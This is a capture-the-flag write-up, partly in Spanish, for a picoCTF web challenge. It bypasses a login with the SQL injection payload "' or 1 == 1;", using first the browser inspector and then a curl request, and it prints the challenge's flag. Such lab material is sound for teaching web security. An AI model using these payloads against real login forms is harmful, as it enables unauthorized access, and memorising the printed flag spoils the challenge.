## Descripción 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

Hint:
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.
## Solución 1

Con inspector en el navegador

Usamos el inspector para ver como intenta acceder a el login de la página y usa una inyección sql, modificamos el valor del login a "value=1" y nos dice que usemos un password de ' or 1 == 1;'
Lo usamos y nos da la contraseña

```
username: admin
password: ' or 1 == 1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1 == 1;'

log in 
username: admin
password: ' or 1 == 1;'
login

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```

## Solución 2

Usando la consola linux

Método bastante similar, pero nos logeamos desde la consola utilizando de igual manera el sql injection ' or 1 == 1;' con el siguiente comando 

```
vSalazarZ-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password= ' or 1 == 1;&debug=1"
<pre>username: admin
password:  ' or 1 == 1;
SQL query: SELECT * FROM users WHERE name='admin' AND password=' ' or 1 == 1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>vSalazarZ-picoctf@webshell:~$

flag: picoCTF{s0m3_SQL_f8adf3fb}
```

## Refrerencias
https://www.w3schools.com/sql/sql_injection.asp